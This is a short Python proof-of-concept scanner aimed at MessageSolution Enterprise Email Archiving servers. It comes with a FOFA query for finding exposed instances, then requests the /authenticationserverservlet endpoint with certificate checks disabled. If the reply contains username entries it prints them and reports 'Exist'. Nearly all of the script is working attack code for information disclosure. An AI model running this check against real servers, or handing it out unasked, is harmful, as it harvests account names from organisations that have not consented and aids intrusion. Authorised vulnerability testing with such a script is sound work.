#/bin/bash/env python3
#_*_coding:utf-8_*_

import requests
import sys
import os
import re

def title():
    print('+          FOFA: title="MessageSolution Enterprise Email Archiving (EEA)"')
    
def run_proto(url):
    url = url + '/authenticationserverservlet'
    referer = url + '/indexcommon.jsp'
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
              'Referer': referer,
              'Content-Type': 'application/x-www-form-urlencoded'
              }
    try:
        requests.packages.urllib3.disable_warnings()
        resp = requests.get(url=url, headers=header, verify=False, timeout=(3, 3))
        reContent = re.search('username>.*?username>', resp.text, re.I | re.M)
        if reContent and resp.status_code == 200:
            print(reContent)
            return True
        else:
            return False
    except Exception as e:
        return False
    
    
def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1
            
            
if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
